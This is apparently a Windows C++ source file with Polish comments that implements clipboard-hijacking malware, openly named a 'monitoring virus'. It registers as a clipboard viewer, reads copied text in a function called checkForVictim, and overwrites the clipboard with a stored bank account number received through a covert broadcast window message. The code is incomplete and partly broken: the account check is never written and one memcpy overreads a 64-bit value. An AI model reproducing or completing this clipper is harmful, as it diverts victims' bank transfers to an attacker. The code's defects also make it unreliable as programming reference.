#include <Windows.h>

bool init(HINSTANCE);
LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
void DecodeMessage(WPARAM, LPARAM);

const char szClassName[] = "WirusMonitorujacy";
char* bankAccount;
HWND hwndThis;
static HWND hwndNextViewer;
UINT messageCode;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	if (!init(hInstance)) return 1;

	MSG msg;

	while (GetMessage(&msg, NULL, 0, 0) > 0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return 0;
}

bool init(HINSTANCE hInstance)
{
	WNDCLASSEX wc;

	wc.cbSize = sizeof(WNDCLASSEX);
	wc.style = 0;
	wc.lpfnWndProc = WndProc;
	wc.cbClsExtra = 0;
	wc.cbWndExtra = 0;
	wc.hInstance = hInstance;
	wc.hIcon = NULL;
	wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
	wc.hbrBackground = NULL;
	wc.lpszMenuName = NULL;
	wc.lpszClassName = szClassName;
	wc.hIconSm = NULL;

	if(!RegisterClassEx(&wc)) return false;

	hwndThis = CreateWindowEx(
		NULL,
		szClassName,
		"",
		WS_DISABLED,
		0, 0, 0, 0,
		NULL,
		NULL,
		hInstance,
		NULL
	);

	if (hwndThis == NULL) return false;

	messageCode = RegisterWindowMessage((LPCSTR)"Nic podejrzanego");

	bankAccount = (char*)malloc(17*sizeof(char));

	return true;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	if (msg == messageCode)
	{
		// nasza magia z u¿yciem prywatnego kodu wiadomoœci
		DecodeMessage(wParam, lParam);
	}
	else switch (msg)
	{
	case WM_CREATE:
		hwndNextViewer = SetClipboardViewer(hwnd);
		break;
	case WM_CLIPBOARDUPDATE:
		if (hwndNextViewer != NULL)
			SendMessage(hwndNextViewer, msg, wParam, lParam);
		break;
	case WM_CHANGECBCHAIN:
		if ((HWND)wParam == hwndNextViewer)
			hwndNextViewer = HWND(lParam);
		else
			if (hwndNextViewer != NULL)
				SendMessage(hwndNextViewer, msg, wParam, lParam);
		break;
	case WM_CLOSE:
		DestroyWindow(hwnd);
		break;
	case WM_DESTROY:
		ChangeClipboardChain(hwnd, hwndNextViewer);
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hwnd, msg, wParam, lParam);
	}
	return 0;
}

void MoveToCb()
{
	// zaalokowanie pamiêci globalnej
	int wLen = 16;
	HGLOBAL hGlMem = GlobalAlloc(GHND, (DWORD)wLen + 1);
	HGLOBAL lpGlMem = GlobalLock(hGlMem);

	// skopiowanie naszego numeru konta do pam. globalnej
	memcpy(lpGlMem, bankAccount, wLen + 1);
	GlobalUnlock(hGlMem);

	// podmiana schowka
	OpenClipboard(hwndThis);
	EmptyClipboard();
	SetClipboardData(CF_TEXT, hGlMem);
	CloseClipboard();
}

void checkForVictim()
{
	OpenClipboard(hwndThis);
	HGLOBAL hCbMem = GetClipboardData(CF_TEXT);
	if (hCbMem == NULL) // nie mo¿na pobraæ ¿adnego tekstu
	{
		CloseClipboard();
		return;
	}
	else // jest tekst - sprawdzam czy to numer konta. Jeœli tak - zamiana.
	{
		HGLOBAL hProgMem = GlobalAlloc(GHND, GlobalSize(hCbMem));
		LPSTR lpCbMem = LPSTR(GlobalLock(hCbMem));
		LPSTR lpProgMem = LPSTR(GlobalLock(hProgMem));
		lstrcpy(lpProgMem, lpCbMem);
		GlobalUnlock(hCbMem);
		GlobalUnlock(hProgMem);
		CloseClipboard();
		// hProgMem - adres tymczasowej zmiennej w schowku
		
	}
}

void RequestAccount()
{
	PostMessage(HWND_BROADCAST, messageCode, 0, 0);
}

void DecodeMessage(WPARAM wParam, LPARAM lParam)
{
	switch (wParam)
	{
	case 1:
		// Otrzymujemy nowy adres konta bankowego
		memcpy(bankAccount, &lParam, 17);
		break;
	}
}